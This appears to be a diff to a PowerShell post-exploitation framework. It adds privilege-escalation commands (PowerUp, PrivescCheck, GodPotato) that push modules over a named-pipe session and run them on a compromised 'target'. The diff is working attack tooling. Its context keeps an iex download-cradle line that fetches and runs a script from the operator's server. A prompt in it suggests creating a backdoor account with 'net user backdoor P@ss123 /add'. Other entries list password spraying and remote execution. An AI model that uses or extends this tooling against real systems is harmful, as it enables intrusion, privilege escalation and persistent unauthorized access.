@@ -1745,6 +1745,10 @@ function Start-LocalShell {
         'Remoting'         = @{ tools=@('Invoke-SMBRemoting','Invoke-WMIRemoting');             invoke=$null }
         'SessionHunter'    = @{ tools=@('Invoke-SessionHunter');                                 invoke=$null }
         'PsMapExec'        = @{ tools=@('PsMapExec');                                            invoke=$null }
+        # LPE
+        'PowerUp'          = @{ tools=@('PowerUp');          invoke='Invoke-AllChecks' }
+        'PrivescCheck'     = @{ tools=@('PrivescCheck');      invoke='Invoke-PrivescCheck' }
+        'GodPotato'        = @{ tools=@('Invoke-GodPotato'); invoke=$null }
     }
 
     Write-Output ""
@@ -1825,6 +1829,11 @@ function Start-LocalShell {
             Write-Output "   Remoting           Remote command execution SMB/WMI - use: Invoke-SMBRemoting / Invoke-WMIRemoting"
             Write-Output "   SessionHunter      Hunt for active user sessions"
             Write-Output "   PsMapExec          Network attacks/mapping - use: PsMapExec <Method> -Targets <targets> [-Domain <domain>]"
+            Write-Output ""
+            Write-Output " [+] LPE:"
+            Write-Output "   PowerUp            Run Invoke-AllChecks (PowerUp privilege escalation checks)"
+            Write-Output "   PrivescCheck       Run Invoke-PrivescCheck (comprehensive LPE audit)"
+            Write-Output "   GodPotato          Load GodPotato -- use: Invoke-GodPotato -cmd ""cmd /c whoami"""
             Write-Output ""
             continue
         }
@@ -3271,7 +3280,50 @@ function InteractWithPipeSession{
 			$sw.WriteLine("iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Invoke-SessionHunter.ps1')")
 			$sw.Flush()
 		}
-		
+
+		elseif ($command -eq 'PowerUp') {
+			Write-Output ""
+			Write-Output " [+] Sending PowerUp to target..."
+			if (Send-Module -ToolName 'PowerUp' -Writer $sw -Reader $sr) {
+				Write-Output " [+] PowerUp loaded -- running Invoke-AllChecks"
+				Write-Output ""
+				$sw.WriteLine("Invoke-AllChecks")
+				$sw.Flush()
+			} else {
+				Write-Output " [-] PowerUp not in cache. Add PowerUp.ps1 to Tools\ and run: modules reload"
+			}
+		}
+
+		elseif ($command -eq 'PrivescCheck') {
+			Write-Output ""
+			Write-Output " [+] Sending PrivescCheck to target..."
+			if (Send-Module -ToolName 'PrivescCheck' -Writer $sw -Reader $sr) {
+				Write-Output " [+] PrivescCheck loaded -- running Invoke-PrivescCheck"
+				Write-Output ""
+				$sw.WriteLine("Invoke-PrivescCheck")
+				$sw.Flush()
+			} else {
+				Write-Output " [-] PrivescCheck not in cache. Add PrivescCheck.ps1 to Tools\ and run: modules reload"
+			}
+		}
+
+		elseif ($command -eq 'GodPotato') {
+			Write-Output ""
+			[Console]::Write(" GodPotato command to run (e.g. cmd /c net user backdoor P@ss123 /add): ")
+			$gpCmd = Read-Host
+			if ($gpCmd) {
+				Write-Output " [+] Sending GodPotato to target..."
+				if (Send-Module -ToolName 'Invoke-GodPotato' -Writer $sw -Reader $sr) {
+					Write-Output " [+] GodPotato loaded -- executing: $gpCmd"
+					Write-Output ""
+					$sw.WriteLine("Invoke-GodPotato -cmd `"$gpCmd`"")
+					$sw.Flush()
+				} else {
+					Write-Output " [-] GodPotato not in cache. Add Invoke-GodPotato.ps1 to Tools\ and run: modules reload"
+				}
+			}
+		}
+
 		elseif ($command -like "help") {
 			Get-AvailableCommands
 			continue
@@ -6327,6 +6379,13 @@ function Get-AvailableCommands  {
 	Write-Output " PassSpray          Domain Password Spray"
 	Write-Output " Remoting           Remote Command Execution SMB|WMI|WinRM"
 	Write-Output " SessionHunter      Hunt for Active User Sessions"
+	Write-Output ""
+	Write-Output ""
+	Write-Output " [+] LPE:"
+	Write-Output ""
+	Write-Output " PowerUp            Run Invoke-AllChecks (PowerUp)"
+	Write-Output " PrivescCheck       Run Invoke-PrivescCheck"
+	Write-Output " GodPotato          Load GodPotato (prompts for command)"
 	Write-Output ""
 	Write-Output ""
 }
